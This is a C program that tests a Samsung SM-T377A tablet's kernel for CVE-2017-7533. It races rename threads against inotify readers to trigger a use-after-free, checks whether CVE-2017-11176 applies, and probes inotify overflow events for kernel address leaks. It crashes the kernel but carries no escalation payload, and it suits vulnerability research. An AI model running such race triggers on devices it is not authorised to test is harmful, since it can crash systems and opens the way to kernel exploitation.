/*
 * inotify_race.c - CVE-2017-7533 inotify/rename race condition
 * Samsung SM-T377A, kernel 3.10.9, security patch 2017-07-01
 *
 * The vulnerability: a race between inotify_handle_event() and rename()
 * causes a use-after-free in fsnotify. The race window is between
 * d_move() updating the dentry name and inotify reading the old name.
 *
 * Also tests CVE-2017-11176 (mq_notify) if available.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sched.h>
#include <signal.h>
#include <dirent.h>

#define TEST_DIR "/data/local/tmp/inotify_test"
#define N_ITERATIONS 5000

static volatile int stop_race = 0;

/* Thread 1: rapidly rename files */
static void *rename_thread(void *arg) {
    char path_a[256], path_b[256];
    snprintf(path_a, sizeof(path_a), "%s/file_a", TEST_DIR);
    snprintf(path_b, sizeof(path_b), "%s/file_b", TEST_DIR);
    
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    while (!stop_race) {
        /* Create file_a, rename to file_b, then back */
        int fd = open(path_a, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            write(fd, "data", 4);
            close(fd);
        }
        rename(path_a, path_b);
        rename(path_b, path_a);
        unlink(path_a);
    }
    return NULL;
}

/* Thread 2: rapidly read inotify events */
static void *inotify_thread(void *arg) {
    int ifd = inotify_init1(IN_NONBLOCK);
    if (ifd < 0) return NULL;
    
    int wd = inotify_add_watch(ifd, TEST_DIR,
        IN_CREATE | IN_DELETE | IN_MOVED_FROM | IN_MOVED_TO |
        IN_MODIFY | IN_ATTRIB | IN_CLOSE_WRITE);
    if (wd < 0) { close(ifd); return NULL; }
    
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(1, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    char buf[4096];
    long total_events = 0;
    
    while (!stop_race) {
        ssize_t len = read(ifd, buf, sizeof(buf));
        if (len > 0) {
            /* Parse events to force name access */
            char *ptr = buf;
            while (ptr < buf + len) {
                struct inotify_event *ev = (struct inotify_event *)ptr;
                total_events++;
                /* Access the name field — this is where the UAF can occur */
                if (ev->len > 0) {
                    volatile char c = ev->name[0];
                    (void)c;
                }
                ptr += sizeof(struct inotify_event) + ev->len;
            }
        }
        sched_yield();
    }
    
    printf("  [inotify] %ld events processed\n", total_events);
    inotify_rm_watch(ifd, wd);
    close(ifd);
    return NULL;
}

/* Thread 3: rapidly create/delete files in the directory */
static void *chaos_thread(void *arg) {
    int id = (int)(long)arg;
    char path[256];
    
    while (!stop_race) {
        snprintf(path, sizeof(path), "%s/chaos_%d_%d", TEST_DIR, id, rand() % 100);
        int fd = open(path, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) close(fd);
        unlink(path);
    }
    return NULL;
}

static int test_inotify_race(int duration) {
    printf("=== CVE-2017-7533 inotify/rename Race (%ds) ===\n", duration);
    
    /* Create test directory */
    mkdir(TEST_DIR, 0755);
    
    pid_t pid = fork();
    if (pid < 0) return -1;
    
    if (pid == 0) {
        stop_race = 0;
        pthread_t t_rename, t_inotify, t_chaos1, t_chaos2;
        
        pthread_create(&t_rename, NULL, rename_thread, NULL);
        pthread_create(&t_inotify, NULL, inotify_thread, NULL);
        pthread_create(&t_chaos1, NULL, chaos_thread, (void*)1L);
        pthread_create(&t_chaos2, NULL, chaos_thread, (void*)2L);
        
        sleep(duration);
        stop_race = 1;
        
        pthread_join(t_rename, NULL);
        pthread_join(t_inotify, NULL);
        pthread_join(t_chaos1, NULL);
        pthread_join(t_chaos2, NULL);
        
        printf("  Completed without crash\n");
        _exit(0);
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    /* Cleanup */
    DIR *d = opendir(TEST_DIR);
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d))) {
            if (ent->d_name[0] == '.') continue;
            char p[512];
            snprintf(p, sizeof(p), "%s/%s", TEST_DIR, ent->d_name);
            unlink(p);
        }
        closedir(d);
    }
    rmdir(TEST_DIR);
    
    if (WIFSIGNALED(status)) {
        printf("  *** CRASH signal=%d — VULNERABLE! ***\n", WTERMSIG(status));
        return 1;
    }
    printf("  Survived\n");
    return 0;
}

/* Test mq_notify (CVE-2017-11176) — sock UAF via mq_notify */
static int test_mq_notify(void) {
    printf("\n=== CVE-2017-11176 mq_notify Check ===\n");
    
    /* Check if mq_open is available */
    int mqd = syscall(SYS_mq_open, "/test_mq_1234", O_CREAT | O_RDWR, 0644, NULL);
    if (mqd < 0) {
        printf("  mq_open: %s (errno=%d)\n", strerror(errno), errno);
        if (errno == ENOSYS) printf("  POSIX MQ not available — CVE not applicable\n");
        else if (errno == EACCES) printf("  Permission denied — SELinux blocks\n");
        return 0;
    }
    
    printf("  mq_open succeeded: mqd=%d\n", mqd);
    
    /* Clean up */
    syscall(SYS_mq_unlink, "/test_mq_1234");
    close(mqd);
    
    /* The actual vulnerability involves:
     * 1. mq_notify(mqd, SIGEV_THREAD)
     * 2. race: close(mqd) vs retry loop in mq_notify
     * Only test if MQ is available */
    printf("  MQ available — CVE-2017-11176 could be tested\n");
    return 2; /* indicates available for further testing */
}

/* Test for kernel address leak via inotify overflow */
static int test_inotify_overflow_leak(void) {
    printf("\n=== inotify Overflow Info Leak ===\n");
    
    int ifd = inotify_init();
    if (ifd < 0) { printf("  inotify_init failed\n"); return -1; }
    
    /* Add many watches to exhaust queue */
    int wd = inotify_add_watch(ifd, "/data/local/tmp", IN_ALL_EVENTS);
    if (wd < 0) { close(ifd); return -1; }
    
    /* Generate many events to overflow queue */
    for (int i = 0; i < 20000; i++) {
        char p[256];
        snprintf(p, sizeof(p), "/data/local/tmp/overflow_test_%d", i);
        int fd = open(p, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) close(fd);
        unlink(p);
    }
    
    /* Read events and check for IN_Q_OVERFLOW with leaked data */
    char buf[65536];
    ssize_t len;
    int overflow_count = 0;
    
    while ((len = read(ifd, buf, sizeof(buf))) > 0) {
        char *ptr = buf;
        while (ptr < buf + len) {
            struct inotify_event *ev = (struct inotify_event *)ptr;
            if (ev->mask & IN_Q_OVERFLOW) {
                overflow_count++;
                /* Check if wd contains leaked kernel data */
                if (ev->wd != -1 && (ev->wd & 0xC0000000) == 0xC0000000) {
                    printf("  *** Overflow event wd=0x%x — kernel addr leak! ***\n", ev->wd);
                }
            }
            ptr += sizeof(struct inotify_event) + ev->len;
        }
    }
    
    printf("  %d overflow events, no leaks detected\n", overflow_count);
    inotify_rm_watch(ifd, wd);
    close(ifd);
    return 0;
}

int main(void) {
    printf("=== Inotify & MQ Vulnerability Tests ===\n");
    printf("UID=%d, kernel 3.10.9, patch 2017-07-01\n\n", getuid());
    
    int r1 = test_inotify_race(5);
    int r2 = 0;
    if (!r1) r2 = test_inotify_race(10); /* longer race */
    
    int r3 = test_mq_notify();
    int r4 = test_inotify_overflow_leak();
    
    printf("\n=== RESULTS ===\n");
    printf("  CVE-2017-7533 (inotify race): %s\n", (r1||r2) ? "VULNERABLE" : "survived");
    printf("  CVE-2017-11176 (mq_notify): %s\n", 
           r3 == 2 ? "MQ available, needs deeper test" : "not applicable");
    printf("  inotify overflow leak: %s\n", r4 > 0 ? "LEAKED" : "clean");
    
    return 0;
}
